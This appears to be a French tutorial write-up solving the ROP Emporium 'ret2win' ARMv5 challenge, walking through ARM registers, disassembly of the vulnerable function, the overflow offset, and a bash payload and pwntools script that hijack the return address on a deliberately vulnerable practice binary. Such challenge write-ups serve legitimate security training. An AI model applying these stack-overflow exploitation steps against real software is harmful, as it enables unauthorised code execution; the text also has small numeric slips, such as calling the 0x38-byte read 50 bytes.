---
Title: Ropemporium ARMv5 ret2win
Date: 2023-06-21
Tags: [linux, python, ROP, ARMv5, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---


# ret2win ARMv5

## Introduction.

Cette article démarre une série consacrée à la résolution des challenges [ropemporium](https://ropemporium.com/challenge/ret2win.html).
Avec la version ARM.

Voir les recommendation du [Guide du débutant](https://ropemporium.com/guide.html) pour l'installation des prérequis qemu et de la version multi-architecture de gdb.

### Minimum sur l'assembleur ARMv5.

Reference : [azerai cheatsheet](https://azeria-labs.com/assembly-basics-cheatsheet/)


#### Les registres

Généraux

    r0             0x15
    r1             0x40800188
    r2             0x38
    r3             0x0
    r4             0x10614             0x10614
    r5             0x0                 0x0
    r6             0x10428             0x10428
    r7             Utilisé pour les appels syscalls
    r8             0x0                 0x0
    r9             0x0                 0x0
    r10            0x3ffff000          0x3ffff000
    r11            fp : frame pointer, pointe la base de la pile
    r12            ip : Intra Procedure          0x3ff25878
    sp             sp : Stack Pointe, pointe le sommet de la pile
    lr             Link Register, contient l'adresse de retour des instructions bl, ou blx
    pc             Pointeur d'execution, pointe la prochaine instruction.

#### Convention d'appel des fonctions

Les instructions de call sont les instruction bl et blx.

Les paramètres de la fonctions sont attendus dans les premiers registres généraux r0,r1..r10

L'adresse de retour n'est pas placée sur la pile par l'instuction bl mais dans le registe lr.
C'est dans prélude d'une fonction, la valeur le lr est empilée mais par la fonction appelée.

exemple de prélude

    0x00010570      00482de9       push {fp, lr}        ; fp et lr sont empiles
    0x00010574      04b08de2       add fp, sp, 4        ; le frame pointer est incrémenté de
    0x00010578      20d04de2       sub sp, sp, 0x20     ; la pile local est crée

Etat initial

    r10            0x3ffff000          0x3ffff000
    r11            0x408001b4          0x408001b4
    r12            0x21014             0x21014
    sp             0x408001b0          0x408001b0
    lr             0x1054c             0x1054c
    pc             0x10570             0x10570 <pwnme>

Empilement de fp et lr

    0x00010570      00482de9       push {fp, lr}        ; fp et lr sont empiles


    r11            0x408001b4          0x408001b4
    r12            0x21014             0x21014
    sp             0x408001a8          0x408001a8           ; sp augmente
    lr             0x1054c             0x1054c
    pc             0x10574             0x10574 <pwnme+4>

    gef➤  x/10x $sp
    0x408001a8:	0x408001b4	0x0001054c	0x00000000	0x3fe70790
                fp          lr                      ex @fp
    0x408001b8:	0x3ffaf000	0x40800314	0x00000001	0x00010518
    0x408001c8:	0x46db4add	0x39bc4c21

fp est repositionné comme base de la nouvelle pile.
    0x00010574      04b08de2       add fp, sp, 4        ; fp <= sp+4

    r11            0x408001ac          0x408001ac   ; sp+4
    r12            0x21014             0x21014
    sp             0x408001a8          0x408001a8
    lr             0x1054c             0x1054c
    pc             0x10578             0x10578 <pwnme+8>

Décrément de sp

    0x00010578      20d04de2       sub sp, sp, 0x20     ; la pile local est crée

    r11            0x408001ac          0x408001ac
    r12            0x21014             0x21014
    sp             0x40800188          0x40800188
    lr             0x1054c             0x1054c
    pc             0x1057c             0x1057c <pwnme+12>

    gef➤  x/12x $sp
    0x40800188:	0x3ffafd08	0x3febaa14	0x00010614	0x00000000
    0x40800198:	0x00010428	0x00000000	0x00000000	0x00000000
    0x408001a8:	0x408001b4	0x0001054c	0x00000000	0x3fe70790
                ex lr       fp => lr

Au final on a donc

    sp => 0x40800188: 0x3ffafd08
          0x4080018c: 0x3febaa14
    ...
          0x408001a8: 0x408001b4 | fp appelant
    fp => 0x408001ac: 0x0001054c | lr adresse de retour.

On est proche de l'état de la pile x64 32 bits.
    fp => sebp
    lr => seip


## Découverte

### Les fonctions

    gef➤  disas pwnme
    Dump of assembler code for function pwnme:
    0x00010570 <+0>:	push	{r11, lr}
    0x00010574 <+4>:	add	r11, sp, #4
    0x00010578 <+8>:	sub	sp, sp, #32
    0x0001057c <+12>:	sub	r3, r11, #36	; 0x24
    0x00010580 <+16>:	mov	r2, #32
    0x00010584 <+20>:	mov	r1, #0
    0x00010588 <+24>:	mov	r0, r3
    0x0001058c <+28>:	bl	0x10410 <memset@plt>
    0x00010590 <+32>:	ldr	r0, [pc, #64]	; 0x105d8 <pwnme+104>
    0x00010594 <+36>:	bl	0x103d4 <puts@plt>
    0x00010598 <+40>:	ldr	r0, [pc, #60]	; 0x105dc <pwnme+108>
    0x0001059c <+44>:	bl	0x103d4 <puts@plt>
    0x000105a0 <+48>:	ldr	r0, [pc, #56]	; 0x105e0 <pwnme+112>
    0x000105a4 <+52>:	bl	0x103d4 <puts@plt>
    0x000105a8 <+56>:	ldr	r0, [pc, #52]	; 0x105e4 <pwnme+116>
    0x000105ac <+60>:	bl	0x103bc <printf@plt>
    0x000105b0 <+64>:	sub	r3, r11, #36	; 0x24
    0x000105b4 <+68>:	mov	r2, #56	; 0x38
    0x000105b8 <+72>:	mov	r1, r3
    0x000105bc <+76>:	mov	r0, #0
    0x000105c0 <+80>:	bl	0x103c8 <read@plt>
    0x000105c4 <+84>:	ldr	r0, [pc, #28]	; 0x105e8 <pwnme+120>
    0x000105c8 <+88>:	bl	0x103d4 <puts@plt>
    0x000105cc <+92>:	nop			; (mov r0, r0)
    0x000105d0 <+96>:	sub	sp, r11, #4
    0x000105d4 <+100>:	pop	{r11, pc}
    ...
    End of assembler dump.


Observons la fonction vulnerable avec radare2

```
r2 -A ret2win_armv5

[0x00010428]> s sym.pwnme
[0x00010570]> pdf
            ; CALL XREF from main @ 0x10548
┌ 104: sym.pwnme ();
│           ; var void *buf @ fp-0x24
│           ; var int32_t var_4h_2 @ sp+0x20
│           ; var int32_t var_4h @ sp+0x24
│           0x00010570      00482de9       push {fp, lr}
│           0x00010574      04b08de2       add fp, var_4h           ; add fp, sp, 4
│           0x00010578      20d04de2       sub sp, sp, 0x20
│           0x0001057c      24304be2       sub r3, buf
│           0x00010580      2020a0e3       mov r2, 0x20
│           0x00010584      0010a0e3       mov r1, 0                   ; int c
│           0x00010588      0300a0e1       mov r0, r3                  ; void *s
│           0x0001058c      9fffffeb       bl sym.imp.memset           ; void *memset(void *s, int c, size_t n)
│           0x00010590      40009fe5       ldr r0, str.For_my_first_trick
│           0x00010594      8effffeb       bl sym.imp.puts             ; int puts(const char *s)
│           0x00010598      3c009fe5       ldr r0, str.What_could_possibly_go_wrong_
│           0x0001059c      8cffffeb       bl sym.imp.puts             ; int puts(const char *s)
│           0x000105a0      38009fe5       ldr r0, str.You_there__may_I_have ; [0x10730:4]=0x20756f59 ; "You there, may I ..."
│           0x000105a4      8affffeb       bl sym.imp.puts             ; int puts(const char *s)
│           0x000105a8      34009fe5       ldr r0, str.__              ; [0x10790:4]=0x203e ; "> " ; const char *format
│           0x000105ac      82ffffeb       bl sym.imp.printf           ; int printf(const char *format)
│           0x000105b0      24304be2       sub r3, buf                 ; sub r3, fp, 0x24
│           0x000105b4      3820a0e3       mov r2, 0x38                ; '8'
│           0x000105b8      0310a0e1       mov r1, r3                  ; void *buf
│           0x000105bc      0000a0e3       mov r0, 0                   ; int fildes
│           0x000105c0      80ffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x000105c4      1c009fe5       ldr r0, str.Thank_you_      ; [0x10794:4]=0x6e616854 ; "Thank you!" ; const char *s
│           0x000105c8      81ffffeb       bl sym.imp.puts             ; int puts(const char *s)
│           0x000105cc      0000a0e1       mov r0, r0                  ; 0x10794 ; "Thank you!"
│           0x000105d0      04d04be2       sub sp, var_4h_2            ; sub sp, fp, 4
└           0x000105d4      0088bde8       pop {fp, pc}
[0x00010570]>
```

    0x000105b0      24304be2       sub r3, buf
    0x000105b4      3820a0e3       mov r2, 0x38                ; '8'
    0x000105b8      0310a0e1       mov r1, r3                  ; void *buf
    0x000105bc      0000a0e3       mov r0, 0                   ; int fildes
    0x000105c0      80ffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)

L'appel de fonction (branche and link) utilise les registres r0,r1,r2.

La taille lue est 50 et le buffer de lecture est situé en fp-0x24. (fp-36)

Au moment du read :

    sp                                          fp
    v                                           v
    AAAAAAAA AAAAAAAA AAAAAAAA AAAAAAAA save_lr save_fp
    ^                                   ^
    buf=fp-0x24                         buf+0x20

L'offset de débordement est de 0x24 - 4  = 0x20


## Exploitation

### En bash


    ret2win$ printf "%36s\xec\05\01" | qemu-arm -g 1337 ret2win_armv5
    ret2win by ROP Emporium
    ARMv5

    For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
    What could possibly go wrong?
    You there, may I have your input please? And don't worry about null bytes, we're using read()!

    > Thank you!
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}

### En bash et suivi gdb

On va d'une part lancer notre executable avec qemu et une écoute gdb sur le port 1337.
    ret2win$ printf "%36s\xec\05\01" | qemu-arm -g 1337 ret2win_armv5
    ret2win by ROP Emporium
    ARMv5

    For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
    What could possibly go wrong?
    You there, may I have your input please? And don't worry about null bytes, we're using read()!

D'autre part, sur un autre terminal, nous attacher au proces en remote sur ce port.
On pose un point d'arrêt sur l'appel read (pwnme+80).


    ret2win$ gdb-multiarch ret2win_armv5
    ...
    gef➤  target remote localhost:1337
    gef➤  b *pwnme+80
    Breakpoint 1 at 0x105c0
    gef➤  c

Avant le read

    gef➤  x/12x $sp
    0x40800188:	0x00000000	0x00000000	0x00000000	0x00000000
    0x40800198:	0x00000000	0x00000000	0x00000000	0x00000000
    0x408001a8:	0x408001b4	0x0001054c	0x00000000	0x3fe70790
                fp            lr
ni

    gef➤  x/12x $sp
    0x40800188:	0x20202020	0x20202020	0x20202020	0x20202020
    0x40800198:	0x20202020	0x20202020	0x20202020	0x20202020
    0x408001a8:	0x20202020	0x000105ec	0x00000000	0x3fe70790
                            ret2win

    continue

Le premier écran reçoit

    > Thank you!
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!


### En python

Il est difficile de fonctionner en attachement avec gdb.

On utlise donc gdb.debug pour lancer le programme.

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2win_armv5')

winadr = elf.symbols["ret2win"]

gs='''
b *pwnme+80
c
'''

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)


io.recvuntil(b"> ")

print("ret2win addr : ",hex(winadr))
PL=0x24*b"A"+p32(winadr)
io.sendline(PL)
io.interactive()
```

En mode debug le module pwntools lance bien le programme avec gdb-multiarch et la bonne architecture.

    ret2win$ python3 solve.py -d
    [*] '/home/jce/w/ropemporium/armv5/ret2win/ret2win_armv5'
        Arch:     arm-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x10000)
    [+] Starting local process '/usr/bin/qemu-arm': pid 37527
    [*] running in new terminal: ['/usr/bin/gdb-multiarch', '-q', '-x', '/tmp/pwn6t7qss2t.gdb']
    ret2win addr :  0x105ec
    [*] Switching to interactive mode
    Thank you!
    Well done! Here's your flag:
    ROPE{a_placeholder_32byte_flag!}
    qemu: uncaught target signal 11 (Segmentation fault) - core dumped


